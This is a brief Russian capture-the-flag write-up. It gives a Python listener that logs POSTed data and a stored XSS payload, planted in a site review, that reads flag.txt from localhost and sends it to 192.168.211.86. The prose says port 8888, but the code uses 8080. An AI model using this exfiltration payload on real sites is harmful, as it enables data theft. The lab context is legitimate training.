Мы можем оставить отзыв на сайте, который читается автоматически ботом.
Поднимаем сервер на питоне, который работает на порту 8888 и записывает все передаваемые ему данные в файл logs.txt 

Скрипт сервера:

```
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        params = urllib.parse.parse_qs(post_data.decode('utf-8'))
        # Записываем всё, что пришло
        with open('logs.txt', 'a') as f:
            f.write(f"Received: {post_data.decode('utf-8')}\n")
        print(f"Received: {post_data.decode('utf-8')}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
  
def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
```

Отправляем в отзыв скрипт XSS, который читает недоступный для нас файл и отправляет его содержимое нам на сервер.
Примерно каждые 5 секунд бот открывает страницу и активируется XSS.
Скрипт XSS, который по итогу возвращает флаг:

```
<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    fetch('http://192.168.211.86:8080/', {
      method: 'POST',
      mode: 'no-cors',
      body: 'flag=' + encodeURIComponent(data)
    });
  })
  .catch(error => {
    fetch('http://192.168.211.86:8080/', {
      method: 'POST',
      mode: 'no-cors',
      body: 'error: ' + error.message
    });
  });
</script>
```
